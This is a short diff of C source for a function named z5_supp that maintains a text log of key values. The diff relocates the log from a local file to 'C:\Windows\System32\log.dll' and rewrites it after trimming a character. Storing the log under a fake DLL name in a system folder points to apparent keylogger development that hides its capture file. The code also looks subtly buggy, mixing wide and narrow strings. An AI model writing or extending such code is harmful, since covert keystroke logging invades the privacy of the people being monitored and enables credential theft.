@@ -22,8 +22,8 @@ short z5_supp(int key_value)
 	i = 0;
 
 	line = (char *)malloc(sizeof(wchar_t) * 200);
-	//fichier = fopen("C:\\Windows\\System32\\log.dll", "r");
-	fichier = fopen("log.dll", "r");
+	fichier = fopen("C:\\Windows\\System32\\log.dll", "r");
+	//fichier = fopen("log.dll", "r");
 	if (fichier)
 	{
 		while (fgets(line, 200, fichier) != NULL)
@@ -36,11 +36,12 @@ short z5_supp(int key_value)
 			if (read[end - 2] != '\n' || read[end - 3] != '-')
 			{
 				read[end - 1] = 0;
-				fichier = freopen("log.dll", "w", fichier);
-				fputs(read, fichier);
+				fichier = freopen("C:\\Windows\\System32\\log.dll", "w", fichier);
+				//fichier = freopen("log.dll", "w", fichier);
+				fwprintf(fichier, L"%s", read);
+				fclose(fichier);
 				free(read);
 				free(line);
-				fclose(fichier);
 				return (0);
 			}
 			free(read);
